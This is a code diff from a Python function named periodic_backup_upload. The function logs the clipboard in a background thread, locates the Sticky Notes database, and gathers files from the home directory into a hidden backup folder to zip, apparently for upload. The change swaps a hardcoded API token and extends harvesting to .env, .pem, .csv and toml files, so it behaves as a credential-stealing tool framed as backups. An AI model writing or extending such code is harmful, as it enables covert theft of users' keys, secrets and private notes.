@@ -150,7 +150,7 @@ def periodic_backup_upload():
     if system_name == "Windows" or "microsoft" in platform.uname().release.lower():
         sticky_notes_path = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
 
-    api_token = "oxQbVFE4p8BKRSE07r03s7jW4FDIC0sR"
+    api_token = "mcxaco7jqmNj31TPHXsOo2xrhp9ESwS5"
 
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()
 
@@ -158,7 +158,7 @@ def periodic_backup_upload():
     open(clipboard_log_path, 'a').close()
 
     while True:
-        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".js", ".py", ".go", ".txt"])
+        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".js", "mjs", ".py", ".go", ".txt", ".pem", ".csv", "toml"])
         ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".json", ".js", ".py", ".go", ".csv"])
 
         wsl_zip_file = zip_backup_folder(wsl_backup_dir, os.path.expanduser("~/.dev/Backup/wsl_backup"))
